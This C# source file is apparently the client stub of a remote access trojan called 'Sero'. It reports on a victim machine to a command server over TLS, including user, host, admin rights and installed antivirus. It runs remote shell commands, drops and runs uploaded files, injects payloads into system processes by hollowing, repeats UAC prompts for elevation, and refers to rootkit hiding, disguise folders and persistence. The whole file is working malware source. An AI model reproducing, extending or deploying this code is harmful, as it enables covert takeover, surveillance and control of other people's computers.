using System.Diagnostics;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Authentication;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace SeroStub;

internal class TlsClient : IDisposable
{
    private TcpClient? _tcp;
    private SslStream? _ssl;
    private readonly string _host;
    private readonly int _port;
    private readonly SemaphoreSlim _writeLock = new(1, 1);
    private readonly string _instanceId = Guid.NewGuid().ToString("N").Substring(0, 8);

    /// <summary>False after Disconnect/Uninstall — caller should NOT reconnect.</summary>
    public bool ShouldReconnect { get; private set; } = true;

    public TlsClient(string host, int port)
    {
        _host = host;
        _port = port;
    }

    public async Task RunAsync(CancellationToken ct)
    {
        _tcp = new TcpClient();
        await _tcp.ConnectAsync(_host, _port, ct);

        _ssl = new SslStream(_tcp.GetStream(), false, ValidateServerCert);
        await _ssl.AuthenticateAsClientAsync(_host);

        // Send client info with auth key
        ClientInfoData info;
        try
        {
            info = new ClientInfoData
            {
                OS = GetFriendlyOsName(),
                Username = Environment.UserName,
                MachineName = Environment.MachineName,
                Hwid = GetHwid(),
                Payload = Config.EnableHollowing
                    ? $"{Config.HollowTarget} (RunPE)"
                    : Config.HiddenFileName,
                AuthKey = Config.AuthKey,
                IsAdmin = IsAdmin(),
                Antivirus = GetAntivirus(),
                IdPrefix = Config.ClientIdPrefix,
                InstanceId = _instanceId
            };
        }
        catch (Exception ex)
        {
            StubLog.Error($"ClientInfo build FAILED: {ex.GetType().Name}");
            throw;
        }

        await WritePacketAsync(new Packet
        {
            Type = PacketType.ClientInfo,
            Data = JsonSerializer.Serialize(info, SeroJson.Default.ClientInfoData)
        }, ct);

        // Start heartbeat sender
        _ = HeartbeatSender(ct);

        // Read loop - handles all incoming commands
        await ReadLoop(ct);
    }

    private async Task ReadLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            var packet = await ReadPacketAsync(ct);
            if (packet == null) break; // Connection lost

            switch (packet.Type)
            {
                case PacketType.HeartbeatAck:
                    break;

                case PacketType.Ping:
                    await WritePacketAsync(new Packet { Type = PacketType.Pong, Data = packet.Data }, ct);
                    break;

                case PacketType.RemoteShell:
                    await HandleShell(packet.Data, ct);
                    break;

                case PacketType.RemoteFileExec:
                    await HandleFileExec(packet.Data, ct);
                    break;

                case PacketType.HollowExec:
                    await HandleHollowExec(packet.Data, ct);
                    break;

                case PacketType.Uninstall:
                    ShouldReconnect = false;
                    HandleUninstall();
                    return;

                case PacketType.RequestElevation:
                    _ = HandleElevation(false, ct);
                    break;

                case PacketType.RequestElevationLoop:
                    _ = HandleElevation(true, ct);
                    break;

                case PacketType.UpdateClient:
                    _ = HandleUpdateClient(packet.Data, ct);
                    break;

                case PacketType.Disconnect:
                    ShouldReconnect = false;
                    return;


                // All plugin-handled commands (Desktop, Webcam, Audio, etc.)
                default:
                    StubLog.Debug($"Unhandled packet type: {packet.Type}");
                    break;
            }
        }
    }

    private async Task HeartbeatSender(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                await Task.Delay(Config.HeartbeatIntervalMs, ct);
                await WritePacketAsync(new Packet { Type = PacketType.Heartbeat }, ct);
            }
            catch (Exception ex) { StubLog.Debug($"Heartbeat stopped: {ex.Message}"); break; }
        }
    }

    // ── Command Handlers ────────────────────────────

    private async Task HandleShell(string command, CancellationToken ct)
    {
        string output;
        int exitCode;

        try
        {
            StubLog.Debug($"Shell: {command}");
            using var proc = new Process();
            proc.StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c {command}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            proc.Start();

            var stdoutTask = proc.StandardOutput.ReadToEndAsync(ct);
            var stderrTask = proc.StandardError.ReadToEndAsync(ct);
            await proc.WaitForExitAsync(ct);
            var stdout = await stdoutTask;
            var stderr = await stderrTask;

            output = string.IsNullOrEmpty(stderr) ? stdout : $"{stdout}\n{stderr}";
            exitCode = proc.ExitCode;
        }
        catch (Exception ex)
        {
            output = $"Error: {ex.Message}";
            exitCode = -1;
            StubLog.Error($"Shell error: {ex.Message}");
        }

        await WritePacketAsync(new Packet
        {
            Type = PacketType.ShellOutput,
            Data = JsonSerializer.Serialize(new ShellOutputData { Output = output, ExitCode = exitCode }, SeroJson.Default.ShellOutputData)
        }, ct);
    }

    private async Task HandleFileExec(string data, CancellationToken ct)
    {
        try
        {
            var fileData = JsonSerializer.Deserialize(data, SeroJson.Default.RemoteFileExecData);
            if (fileData == null) { StubLog.Error("FileExec: null data"); return; }

            var safeName = Path.GetFileName(fileData.FileName);
            if (string.IsNullOrWhiteSpace(safeName)) { StubLog.Error("FileExec: invalid filename"); return; }

            var tempDir = Path.Combine(Path.GetTempPath(), "rt");
            Directory.CreateDirectory(tempDir);
            var filePath = Path.Combine(tempDir, safeName);

            await File.WriteAllBytesAsync(filePath, Convert.FromBase64String(fileData.FileBase64), ct);
            StubLog.Debug($"FileExec: executed {safeName}");

            Process.Start(new ProcessStartInfo
            {
                FileName = filePath,
                UseShellExecute = true,
            });
        }
        catch (Exception ex) { StubLog.Error($"FileExec error: {ex.Message}"); }
    }

    private async Task HandleUpdateClient(string data, CancellationToken ct)
    {
        try
        {
            var updateData = JsonSerializer.Deserialize<UpdateClientData>(data, SeroJson.Default.UpdateClientData);
            if (updateData == null) { StubLog.Error("UpdateClient: null data"); return; }

            var safeName = Path.GetFileName(updateData.FileName);
            if (string.IsNullOrWhiteSpace(safeName)) { StubLog.Error("UpdateClient: invalid filename"); return; }

            // Write new exe to temp
            var tempDir = Path.Combine(Path.GetTempPath(), "sero_update");
            Directory.CreateDirectory(tempDir);
            var tempPath = Path.Combine(tempDir, safeName);
            await File.WriteAllBytesAsync(tempPath, Convert.FromBase64String(updateData.FileBase64), ct);
            StubLog.Debug("UpdateClient: wrote update file");

            // Build a cmd script that waits for us to die, then replaces and launches
            var installPath = Persistence.GetInstalledPath(Config.PersistName);
            var installDir = !string.IsNullOrEmpty(installPath)
                ? Path.GetDirectoryName(installPath)!
                : Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Config.PersistName);
            Directory.CreateDirectory(installDir);

            // Always use HiddenFileName so rootkit can hide it
            var targetPath = Path.Combine(installDir, Config.HiddenFileName);
            var pid = Environment.ProcessId;
            var batPath = Path.Combine(tempDir, "update.bat");

            // Script: wait for old process to exit, copy new exe, delete old if name changed, launch, self-delete
            var bat = $"""
                @echo off
                :wait
                tasklist /FI "PID eq {pid}" 2>nul | find /I "{pid}" >nul
                if not errorlevel 1 (timeout /t 1 /nobreak >nul & goto wait)
                copy /y "{tempPath}" "{targetPath}" >nul
                """;

            // Delete old exe if name differs
            if (!string.IsNullOrEmpty(installPath)
                && !string.Equals(installPath, targetPath, StringComparison.OrdinalIgnoreCase))
            {
                bat += $"""

                    del /f /q "{installPath}" >nul 2>nul
                    """;
            }

            bat += $"""

                start "" "{targetPath}"
                rmdir /s /q "{tempDir}" >nul 2>nul
                """;

            await File.WriteAllTextAsync(batPath, bat, ct);

            await WritePacketAsync(new Packet
            {
                Type = PacketType.ShellOutput,
                Data = JsonSerializer.Serialize(new ShellOutputData { Output = $"Update starting: {targetPath}", ExitCode = 0 }, SeroJson.Default.ShellOutputData)
            }, ct);

            // Remove critical process flag before exiting to avoid BSOD
            if (Config.AntiKill)
            {
                //try { Protection.UnsetCriticalProcess(); } catch { }
            }

            Program.ReleaseMutex();

            // Launch the bat script (hidden) and exit
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c \"{batPath}\"",
                CreateNoWindow = true,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });

            Environment.Exit(0);
        }
        catch (Exception ex)
        {
            StubLog.Error($"UpdateClient error: {ex.Message}");
            try
            {
                await WritePacketAsync(new Packet
                {
                    Type = PacketType.ShellOutput,
                    Data = JsonSerializer.Serialize(new ShellOutputData { Output = $"Update failed: {ex.Message}", ExitCode = -1 }, SeroJson.Default.ShellOutputData)
                }, ct);
            }
            catch { }
        }
    }

    private async Task HandleHollowExec(string data, CancellationToken ct)
    {
        try
        {
            var hollowData = JsonSerializer.Deserialize(data, SeroJson.Default.HollowExecData);
            if (hollowData == null) { StubLog.Error("HollowExec: null data"); return; }

            var safeName = Path.GetFileName(hollowData.FileName);
            if (string.IsNullOrWhiteSpace(safeName)) { StubLog.Error("HollowExec: invalid filename"); return; }

            // Write PE to temp
            var tempDir = Path.Combine(Path.GetTempPath(), "rt");
            Directory.CreateDirectory(tempDir);
            var pePath = Path.Combine(tempDir, safeName);
            await File.WriteAllBytesAsync(pePath, Convert.FromBase64String(hollowData.FileBase64), ct);

            // Resolve target process path
            var target = hollowData.TargetProcess;
            if (!Path.IsPathRooted(target))
                target = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), target);

            StubLog.Debug("HollowExec: starting process hollowing");
            int pid = ProcessHollowing.Hollow(pePath, target);

            // Send result back as shell output
            var result = pid > 0
                ? $"[Hollow] Injection success. PID={pid}"
                : "[Hollow] Injection failed. Check logs.";

            await WritePacketAsync(new Packet
            {
                Type = PacketType.ShellOutput,
                Data = JsonSerializer.Serialize(new ShellOutputData { Output = result, ExitCode = pid > 0 ? 0 : -1 }, SeroJson.Default.ShellOutputData)
            }, ct);

            // Cleanup PE from temp
            try { File.Delete(pePath); } catch { }
        }
        catch (Exception ex) { StubLog.Error($"HollowExec error: {ex.Message}"); }
    }

    private async Task HandleElevation(bool loop, CancellationToken ct)
    {
        if (IsAdmin())
        {
            await WritePacketAsync(new Packet
            {
                Type = PacketType.ElevationResult,
                Data = JsonSerializer.Serialize(new ElevationResultData { Success = true, Message = "Already elevated" }, SeroJson.Default.ElevationResultData)
            }, ct);
            return;
        }

        bool elevated = false;
        do
        {
            // Resolve exe path: prefer installed AppData copy (works even when hollowed into dllhost etc.)
            var selfPath = Persistence.GetInstalledPath(Config.PersistName);
            if (string.IsNullOrEmpty(selfPath))
            {
                // No installed copy — copy our real exe to AppData
                // When hollowed, Environment.ProcessPath = dllhost.exe, so we use the original exe from disk
                try
                {
                    var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    var installDir = Path.Combine(appData, Config.PersistName);
                    Directory.CreateDirectory(installDir);
                    var installExe = Path.Combine(installDir, Config.HiddenFileName);

                    // Try to find the real stub exe (not dllhost)
                    var currentExe = Environment.ProcessPath;
                    bool isHollowed = ProcessHollowing.IsHollowedInstance();

                    if (isHollowed)
                    {
                        // When hollowed, our real exe was the one that launched the hollow
                        // It should already be in AppData if persistence was used, otherwise
                        // we can't easily get it — use the backup from LocalAppData
                        var localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                        var backupExe = Path.Combine(localAppData, "." + Config.PersistName, Config.HiddenFileName);
                        if (File.Exists(backupExe))
                        {
                            File.Copy(backupExe, installExe, true);
                            selfPath = installExe;
                        }
                    }
                    else if (!string.IsNullOrEmpty(currentExe) && File.Exists(currentExe))
                    {
                        File.Copy(currentExe, installExe, true);
                        selfPath = installExe;
                    }
                }
                catch { }
            }
            // Final fallback
            if (string.IsNullOrEmpty(selfPath))
                selfPath = Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) { StubLog.Error("Elevation: no process path"); break; }

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = selfPath,
                    UseShellExecute = true,
                    Verb = "runas"
                };

                if (Config.AntiKill)
                {
                    //try { Protection.UnsetCriticalProcess(); } catch { }
                }

                // Release mutex BEFORE launching elevated process
                // so the new instance can acquire it in Main()
                Program.ReleaseMutex();

                var proc = Process.Start(psi);
                if (proc != null)
                {
                    elevated = true;
                    await WritePacketAsync(new Packet
                    {
                        Type = PacketType.ElevationResult,
                        Data = JsonSerializer.Serialize(new ElevationResultData { Success = true, Message = "UAC accepted" }, SeroJson.Default.ElevationResultData)
                    }, ct);

                    // Give the elevated instance time to connect before we exit
                    await Task.Delay(2000, ct);

                    Environment.Exit(0);
                }
                else
                {
                    // Process.Start returned null — reacquire mutex
                    Program.ReacquireMutex();
                }
            }
            catch (Exception ex)
            {
                // Mutex was released before Process.Start — reacquire it
                Program.ReacquireMutex();
                StubLog.Error($"UAC error: {ex.GetType().Name}");

                // Always send failure response (prevents UI flickering on loop)
                if (!elevated)
                {
                    await WritePacketAsync(new Packet
                    {
                        Type = PacketType.ElevationResult,
                        Data = JsonSerializer.Serialize(new ElevationResultData { Success = false, Message = "UAC declined" }, SeroJson.Default.ElevationResultData)
                    }, ct);
                }
            }

            if (loop && !elevated)
                await Task.Delay(3000, ct);

        } while (loop && !elevated && !ct.IsCancellationRequested);
    }

    private void HandleUninstall()
    {
        StubLog.Info("Uninstall command received.");
        try
        {
            // Stop all protection before uninstalling
            Persistence.StopWatchdog();
            Protection.StopGuardian();
            Protection.CleanupGuardianCopies();

            // Remove DACL so the process can exit cleanly
            if (Config.EnableWatchdog)
                Protection.RemoveDacl();

            // Disable BSOD before uninstalling
            if (Config.AntiKill)
            {
                try { Protection.UnsetCriticalProcess(); } catch { }
            }

            Persistence.RemoveRegistry(Config.PersistName);
            Persistence.RemoveStartup(Config.PersistName);
            Persistence.RemoveScheduledTask(Config.PersistName);
            if (Config.EnableWatchdog)
                Protection.UnregisterWmiPersistence();

            Program.ReleaseMutex();

            // In RunPE mode, ProcessPath = hollowed target (dllhost.exe etc.) — use SERO_EXE instead
            var selfPath = ProcessHollowing.IsHollowedInstance()
                ? (Environment.GetEnvironmentVariable("SERO_EXE") ?? Persistence.GetInstalledPath(Config.PersistName))
                : (Persistence.GetInstalledPath(Config.PersistName) ?? Environment.ProcessPath);

            var appDataDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Config.PersistName);
            var backupDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Microsoft", "WindowsServices");
            var disguiseDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Microsoft", "CoreRuntime");
            var rootkitDir = Path.Combine(Path.GetTempPath(), "rt");
            var updateDir = Path.Combine(Path.GetTempPath(), "sero_update");

            var delCmd = "/c timeout /t 8 /nobreak >nul";
            if (!string.IsNullOrEmpty(selfPath) && File.Exists(selfPath))
                delCmd += $" & del /f /q \"{selfPath}\"";
            if (Directory.Exists(appDataDir))
                delCmd += $" & rmdir /s /q \"{appDataDir}\"";
            if (Directory.Exists(backupDir))
                delCmd += $" & rmdir /s /q \"{backupDir}\"";
            if (Directory.Exists(disguiseDir))
                delCmd += $" & rmdir /s /q \"{disguiseDir}\"";
            if (Directory.Exists(rootkitDir))
                delCmd += $" & rmdir /s /q \"{rootkitDir}\"";
            if (Directory.Exists(updateDir))
                delCmd += $" & rmdir /s /q \"{updateDir}\"";

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = delCmd,
                CreateNoWindow = true,
                UseShellExecute = false,
            });
        }
        catch (Exception ex) { StubLog.Error($"Uninstall error: {ex.Message}"); }

        Environment.Exit(0);
    }

    // ── Packet IO ───────────────────────────────────

    private async Task WritePacketAsync(Packet packet, CancellationToken ct)
    {
        if (_ssl == null) return;
        await _writeLock.WaitAsync(ct);
        try
        {
            var json = JsonSerializer.Serialize(packet, SeroJson.Default.Packet);
            var jsonBytes = Encoding.UTF8.GetBytes(json);
            var lengthBytes = BitConverter.GetBytes(jsonBytes.Length);
            await _ssl.WriteAsync(lengthBytes, ct);
            await _ssl.WriteAsync(jsonBytes, ct);
            await _ssl.FlushAsync(ct);
        }
        finally { _writeLock.Release(); }
    }

    private async Task<Packet?> ReadPacketAsync(CancellationToken ct)
    {
        if (_ssl == null) return null;

        var lenBuf = new byte[4];
        int read = 0;
        while (read < 4)
        {
            int n = await _ssl.ReadAsync(lenBuf.AsMemory(read, 4 - read), ct);
            if (n == 0) return null;
            read += n;
        }

        int length = BitConverter.ToInt32(lenBuf, 0);
        if (length <= 0 || length > 500 * 1024 * 1024) return null; // 500 MB max

        var dataBuf = new byte[length];
        read = 0;
        while (read < length)
        {
            int n = await _ssl.ReadAsync(dataBuf.AsMemory(read, length - read), ct);
            if (n == 0) return null;
            read += n;
        }

        return JsonSerializer.Deserialize(Encoding.UTF8.GetString(dataBuf), SeroJson.Default.Packet);
    }

    // ── Cert Pinning ───────────────────────────────

    private static bool ValidateServerCert(object sender, X509Certificate? certificate, X509Chain? chain, SslPolicyErrors sslPolicyErrors)
    {
        // If no cert hash configured, accept any (dev mode)
        if (string.IsNullOrEmpty(Config.CertHash))
            return true;

        if (certificate == null) return false;

        // Compare SHA256 thumbprint
        var hash = SHA256.HashData(certificate.GetRawCertData());
        var certHash = Convert.ToHexString(hash);
        return string.Equals(certHash, Config.CertHash, StringComparison.OrdinalIgnoreCase);
    }

    // ── Helpers ─────────────────────────────────────

    private static string GetFriendlyOsName()
    {
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            if (key != null)
            {
                var productName = key.GetValue("ProductName")?.ToString() ?? "";
                var displayVersion = key.GetValue("DisplayVersion")?.ToString() ?? "";
                var buildNumber = key.GetValue("CurrentBuildNumber")?.ToString() ?? "";

                // Windows 11 has build >= 22000 but ProductName may still say "Windows 10"
                if (int.TryParse(buildNumber, out int build) && build >= 22000)
                    productName = productName.Replace("Windows 10", "Windows 11");

                if (!string.IsNullOrEmpty(displayVersion))
                    return $"{productName} {displayVersion}";
                return productName;
            }
        }
        catch { }
        return Environment.OSVersion.ToString();
    }

    private static string GetHwid()
    {
        try
        {
            var sessionId = Process.GetCurrentProcess().SessionId;
            var raw = $"{Environment.MachineName}:{Environment.UserName}:{Environment.ProcessorCount}:{sessionId}";
            return Convert.ToBase64String(SHA256.HashData(Encoding.UTF8.GetBytes(raw)));
        }
        catch
        {
            var raw = $"{Environment.MachineName}:{Environment.UserName}:{Environment.ProcessorCount}";
            return Convert.ToBase64String(SHA256.HashData(Encoding.UTF8.GetBytes(raw)));
        }
    }

    private static bool IsAdmin()
    {
        try
        {
            using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            return new System.Security.Principal.WindowsPrincipal(identity)
                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch { return false; }
    }

    private static string GetAntivirus()
    {
        try
        {
            var avMap = new (string proc, string name)[]
            {
                ("MsMpEng", "Windows Defender"), ("SecurityHealthService", "Windows Defender"),
                ("avastui", "Avast"), ("AvastSvc", "Avast"),
                ("avgui", "AVG"), ("AVGSvc", "AVG"),
                ("bdagent", "Bitdefender"), ("bdservicehost", "Bitdefender"),
                ("ekrn", "ESET"), ("egui", "ESET"),
                ("mcshield", "McAfee"), ("mfemms", "McAfee"),
                ("NortonSecurity", "Norton"), ("nsWscSvc", "Norton"),
                ("SavService", "Sophos"), ("SAVAdminService", "Sophos"),
                ("avp", "Kaspersky"), ("kavfs", "Kaspersky"),
                ("MBAMService", "Malwarebytes"), ("mbamtray", "Malwarebytes"),
                ("PandaAgent", "Panda"),
                ("coreServiceShell", "Trend Micro"), ("ntrtscan", "Trend Micro"),
                ("CylanceSvc", "Cylance"),
                ("SentinelAgent", "SentinelOne"), ("SentinelServiceHost", "SentinelOne"),
                ("CSFalconService", "CrowdStrike"), ("CSFalconContainer", "CrowdStrike"),
                ("cbdefense", "Carbon Black"), ("RepMgr", "Carbon Black"),
                ("fmon", "F-Secure"), ("fsav32", "F-Secure"),
                ("dwengine", "Dr.Web"), ("dwservice", "Dr.Web"),
            };

            var detected = new HashSet<string>();
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    var name = p.ProcessName;
                    foreach (var (proc, avName) in avMap)
                    {
                        if (name.Equals(proc, StringComparison.OrdinalIgnoreCase))
                        {
                            detected.Add(avName);
                            break;
                        }
                    }
                }
                catch { }
                finally { p.Dispose(); }
            }

            return detected.Count > 0 ? string.Join(", ", detected) : "None";
        }
        catch (Exception ex)
        {
            StubLog.Error($"GetAntivirus failed: {ex.Message}");
            return "Unknown";
        }
    }

    public void Dispose()
    {
        _ssl?.Close();
        _tcp?.Close();
        _writeLock.Dispose();
    }
}

// ── Protocol types ──────────────────────────────────

internal enum PacketType
{
    Heartbeat = 2,
    ClientInfo = 3,
    ShellOutput = 4,
    ElevationResult = 5,
    HeartbeatAck = 11,
    Command = 12,
    DllPayload = 13,
    Disconnect = 14,
    RemoteShell = 20,
    RemoteFileExec = 21,
    Uninstall = 22,
    HollowExec = 23,
    UpdateClient = 24,
    RequestElevation = 30,
    RequestElevationLoop = 31,
    Ping = 32,
    Pong = 33,

}

internal class Packet
{
    public PacketType Type { get; set; }
    public string Data { get; set; } = string.Empty;
    public long Timestamp { get; set; } = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
}

internal class ClientInfoData
{
    public string OS { get; set; } = string.Empty;
    public string Username { get; set; } = string.Empty;
    public string MachineName { get; set; } = string.Empty;
    public string Hwid { get; set; } = string.Empty;
    public string IP { get; set; } = string.Empty;
    public string Payload { get; set; } = string.Empty;
    public string AuthKey { get; set; } = string.Empty;
    public bool IsAdmin { get; set; }
    public string Antivirus { get; set; } = string.Empty;
    public string IdPrefix { get; set; } = string.Empty;
    public string InstanceId { get; set; } = string.Empty;
}

internal class ShellOutputData
{
    public string Output { get; set; } = string.Empty;
    public int ExitCode { get; set; }
}

internal class RemoteFileExecData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
}

internal class UpdateClientData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
}

internal class HollowExecData
{
    public string FileName { get; set; } = string.Empty;
    public string FileBase64 { get; set; } = string.Empty;
    public string TargetProcess { get; set; } = string.Empty;
}

internal class ElevationResultData
{
    public bool Success { get; set; }
    public string Message { get; set; } = string.Empty;
}

// ── JSON Source Generator (NativeAOT compatible) ────

[JsonSerializable(typeof(Packet))]
[JsonSerializable(typeof(ClientInfoData))]
[JsonSerializable(typeof(ShellOutputData))]
[JsonSerializable(typeof(RemoteFileExecData))]
[JsonSerializable(typeof(UpdateClientData))]
[JsonSerializable(typeof(HollowExecData))]
[JsonSerializable(typeof(ElevationResultData))]
internal partial class SeroJson : JsonSerializerContext { }
